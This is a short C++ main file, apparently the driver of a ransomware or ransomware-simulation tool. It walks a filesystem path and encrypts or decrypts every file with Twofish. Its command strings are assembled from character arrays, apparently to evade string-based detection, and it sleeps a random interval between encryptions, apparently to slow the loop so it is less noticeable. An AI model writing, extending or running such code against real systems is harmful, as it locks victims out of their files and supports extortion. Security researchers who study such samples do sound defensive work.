#include "encrypt.hpp"
#include "enum.hpp"
#include <chrono>
#include <thread>


int main(int argc, char* argv[]) {
    if (argc < 3)
        return 1;

    // initialize rng
    srand(time(0));

    // Arg comparisons
    char decryptArg[] = { 'd', 'e', 'c', 'r', 'y', 'p', 't', '\0' };
    char encryptArg[] = { 'e', 'n', 'c', 'r', 'y', 'p', 't', '\0' };

    // enumerate files
    std::vector<std::string> files = enumeration::EnumerateFilesystemPath(argv[1]);

    if (argv[2] == std::string(decryptArg)) {
        // loop over files and encrypt
        for (const std::string& filePath : files) {

            // decrypt files
            encryption::DecryptFileTwoFish(filePath);
        }
    }
    else if(argv[2] == std::string(encryptArg)) {
        // loop over files and encrypt
        for (const std::string& filePath : files) {

            // encrypt files
            encryption::EncryptFileTwoFish(filePath);

            // sleep for some time to slow down encryption loop
            std::this_thread::sleep_for(std::chrono::milliseconds(250 + rand() % 1000));
        }
    }


    return 0;
}